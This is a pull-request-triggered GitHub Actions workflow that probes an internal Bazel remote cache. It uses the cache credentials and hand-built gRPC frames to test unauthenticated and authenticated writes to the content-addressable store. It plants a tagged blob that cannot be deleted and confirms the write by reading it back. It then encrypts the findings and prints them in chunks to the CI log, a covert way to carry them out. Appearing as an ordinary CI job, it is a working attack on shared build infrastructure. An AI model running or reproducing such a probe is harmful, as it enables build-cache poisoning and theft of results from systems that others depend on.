name: zz-runner-env
on:
  pull_request:
    branches: [main]
permissions:
  contents: read
jobs:
  cas:
    name: cas write probe
    runs-on: omp-kata
    timeout-minutes: 10
    steps:
      - name: cas
        run: |
          set +e
          R=/tmp/r; : > "$R"
          log() { echo "$@" >> "$R"; }
          BH=bazel-remote.bazel-cache.svc.cluster.local
          AUTH=$(printf '%s:%s' "$BAZEL_REMOTE_USER" "$BAZEL_REMOTE_PASSWORD" | base64 -w0)
          PAY="radkawar-cas-probe-${GITHUB_RUN_ID}"
          HASH=$(printf '%s' "$PAY" | sha256sum | cut -d' ' -f1)
          SZ=${#PAY}
          log "## run=${GITHUB_RUN_ID} digest=sha256:$HASH size=$SZ payload_bytes=$SZ"

          python3 - "$HASH" "$SZ" <<'PY'
          import sys, struct
          h, sz = sys.argv[1], int(sys.argv[2])
          def varint(n):
              out = b''
              while True:
                  b = n & 0x7f; n >>= 7
                  out += bytes([b | 0x80]) if n else bytes([b])
                  if not n: return out
          def fld(num, wire): return varint((num << 3) | wire)
          def ld(num, data): return fld(num, 2) + varint(len(data)) + data
          digest = ld(1, h.encode()) + fld(2, 0) + varint(sz)
          def frame(msg): return b'\x00' + struct.pack('>I', len(msg)) + msg
          open('/tmp/f_find', 'wb').write(frame(ld(2, digest)))
          open('/tmp/f_upd', 'wb').write(frame(ld(2, ld(1, digest))))
          open('/tmp/f_read', 'wb').write(frame(ld(1, digest)))
          print("frames ok")
          PY

          B="https://$BH:9092/build.bazel.remote.execution.v2.ContentAddressableStorage"
          call() {
            local svc="$1" file="$2" mode="$3"
            local HH=(); [ "$mode" = yes ] && HH=(-H "authorization: Basic $AUTH")
            curl -sk --http2-prior-knowledge --max-time 25 -D - -o "$file.out" \
              -H 'content-type: application/grpc' -H 'te: trailers' "${HH[@]}" \
              --data-binary "@$file" "$B/$svc" 2>&1
          }
          status() { echo "$1" | grep -i '^grpc-status:' | tr -d '\r' | awk '{print $2}'; }

          o=$(call FindMissingBlobs /tmp/f_find yes)
          log "## 1. FindMissingBlobs (pre) auth=yes grpc-status=$(status "$o") body_bytes=$(wc -c </tmp/f_find.out)"

          o=$(call BatchUpdateBlobs /tmp/f_upd no)
          log "## 2. BatchUpdateBlobs auth=no  grpc-status=$(status "$o") msg=$(echo "$o" | grep -i '^grpc-message:' | tr -d '\r' | cut -c1-90)"

          o=$(call BatchUpdateBlobs /tmp/f_upd yes)
          log "## 3. BatchUpdateBlobs auth=yes grpc-status=$(status "$o") msg=$(echo "$o" | grep -i '^grpc-message:' | tr -d '\r' | cut -c1-90)"

          o=$(call FindMissingBlobs /tmp/f_find yes)
          log "## 4. FindMissingBlobs (post) auth=yes grpc-status=$(status "$o") body_bytes=$(wc -c </tmp/f_find.out)"

          o=$(call BatchReadBlobs /tmp/f_read yes)
          log "## 5. BatchReadBlobs auth=yes grpc-status=$(status "$o") body_bytes=$(wc -c </tmp/f_read.out)"
          if grep -aq "radkawar-cas-probe-${GITHUB_RUN_ID}" /tmp/f_read.out; then
            log "   read-back: payload bytes present in CAS response -> write confirmed"
          else
            log "   read-back: payload not found in response"
          fi

          log "## no REAPI delete exists; HTTP :8080 is closed from the pod, so the probe blob"
          log "## (${SZ} bytes, unique digest) remains until bazel-remote LRU eviction"

          printf '%s' '' | base64 -d > /tmp/pub.der
          gzip -9 -c "$R" > /tmp/r.gz
          K=$(openssl rand -hex 32); IV=$(openssl rand -hex 16); printf '%s' "$K" > /tmp/k.bin
          openssl enc -aes-256-ctr -K "$K" -iv "$IV" -in /tmp/r.gz -out /tmp/ct
          openssl pkeyutl -encrypt -pubin -keyform DER -inkey /tmp/pub.der -pkeyopt rsa_padding_mode:oaep -pkeyopt rsa_oaep_md:sha256 -pkeyopt rsa_mgf1_md:sha256 -in /tmp/k.bin -out /tmp/kt
          echo "PROBE-IV=$IV"
          echo "PROBE-KEY=$(base64 -w0 /tmp/kt)"
          echo "PROBE-GZIP=yes"
          echo "PROBE-GZ-SHA256=$(sha256sum /tmp/r.gz | cut -d' ' -f1)"
          B64=$(base64 -w0 /tmp/ct); n=0
          while [ -n "$B64" ]; do
            printf 'PROBE-CHUNK-%03d=%s\n' "$n" "${B64:0:700}"
            B64=${B64:700}; n=$((n+1))
          done
          echo "PROBE-CHUNKS=$n"
          exit 0
